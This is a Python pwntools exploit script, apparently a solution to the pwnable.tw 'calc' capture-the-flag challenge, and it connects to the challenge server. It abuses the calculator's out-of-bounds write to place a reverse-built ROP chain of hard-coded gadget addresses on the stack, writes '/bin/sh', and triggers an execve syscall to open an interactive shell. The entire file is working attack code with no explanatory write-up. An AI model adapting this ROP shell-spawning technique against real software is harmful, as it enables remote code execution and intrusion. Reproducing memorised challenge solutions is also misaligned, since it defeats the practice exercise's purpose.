from pwn import *

def send_num(new_offset, inst, inc, sign='+'):
	global offset
	offset += inc
	p.sendline(('+' + str(new_offset) + sign + str(inst)).encode())

context.clear(terminal = ['tmux', 'splitw', '-fh'])

ov = '''
b *0x8049432
c
ni 2
'''

#p = gdb.debug('./calc', gdbscript=ov)
#p = process('./calc')
p = remote('chall.pwnable.tw', 10100)

print(p.recvline().decode())

fix_counter = b'*1'
calc_retaddr_offset = 382
offset = 0

# Gadgets
pop_eax_offset = 11
pop_eax = 0x805c34b - pop_eax_offset

pop_ecx_ebx = 0x80701d1
pop_edx = 0x80701aa
dec_ecx = 0x806f4eb
dec_edx = 0x80e72e3
int_0x80 = 0x8070880
mov_edx_esp_0x18 = 0x80b6397
xchg_eax_ebx = 0x80a6d51

### ROPCHAIN TO POP SHELL (in reverse) ###

# int 0x80
send_num(calc_retaddr_offset, int_0x80, 2)

# eax = 0xb
chain  = ('+' + str(int(calc_retaddr_offset) - offset)).encode()
chain += ('+' + str(pop_eax)).encode()
chain += fix_counter
chain += ('+' + str(pop_eax_offset)).encode()
offset += 1

p.sendline(chain)

# dec edx
send_num(calc_retaddr_offset - offset, dec_edx, 1)

# edx = 1
send_num(calc_retaddr_offset - offset, 1, 1, '-')

send_num(calc_retaddr_offset - offset, pop_edx, 1)

# xchg eax, ebx
send_num(calc_retaddr_offset - offset, xchg_eax_ebx, 12)

# edx = ptr to '/bin/sh'
# eax = ptr t0 '/bin/sh'
# esp += 0x2c
send_num(calc_retaddr_offset - offset, mov_edx_esp_0x18, 1)

# dec ecx
send_num(calc_retaddr_offset - offset, dec_ecx, 1)

# ecx = 1 ; ebx = 1
send_num(calc_retaddr_offset - offset, 1, 1, '-')
send_num(calc_retaddr_offset - offset, 1, 1, '-')
send_num(calc_retaddr_offset - offset, pop_ecx_ebx, 1)

# write '/sh'
send_num(calc_retaddr_offset + 3, int(b'/sh'[::-1].hex(), 16), 0)

# write '/bin'
send_num(calc_retaddr_offset + 2, int(b'/bin'[::-1].hex(), 16), 0)

# set stack var to point to '/bin/sh'
send_num(calc_retaddr_offset - 10, 80, 0, '-')

p.sendline(b'')

p.interactive()
